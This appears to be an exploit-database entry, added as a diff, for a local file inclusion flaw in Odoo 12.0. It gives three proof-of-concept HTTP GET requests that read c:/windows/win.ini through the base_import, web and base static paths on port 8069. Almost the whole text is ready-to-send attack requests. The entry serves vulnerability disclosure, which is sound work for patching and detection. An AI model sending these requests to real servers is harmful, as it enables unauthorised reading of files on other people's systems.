@@ -1,0 +1,57 @@
+# Exploit Title: Odoo 12.0 - Local File Inclusion
+# Date: 2019-06-14
+# Exploit Author: Emre ÖVÜNÇ
+# Vendor Homepage: https://www.odoo.com/
+# Software Link: https://www.odoo.com/tr_TR/page/download
+# Version: v12.0
+# Tested on: Windows/Linux
+# https://github.com/EmreOvunc/Odoo-12.0-LFI-Vulnerabilities
+# https://www.odoo.com/security-report
+
+# PoC-1
+To exploit vulnerability, someone could use
+'http://[HOST]:8069/base_import/static/c:/windows/win.ini'
+request to get some information from the target.
+
+GET /base_import/static/c:/windows/win.ini HTTP/1.1
+Host: [TARGET]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0)
+Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+# PoC-2
+To exploit vulnerability, someone could use 'http://[HOST]:8069/
+web/static/c:/windows/win.ini' request to get some information from the
+target.
+
+GET /web/static/c:/windows/win.ini HTTP/1.1
+Host: [TARGET]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0)
+Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+# PoC-3
+To exploit vulnerability, someone could use 'http://[HOST]:8069/
+base/static/c:/windows/win.ini' request to get some information from the
+target.
+
+GET /base/static/c:/windows/win.ini HTTP/1.1
+Host: [TARGET]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0)
+Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
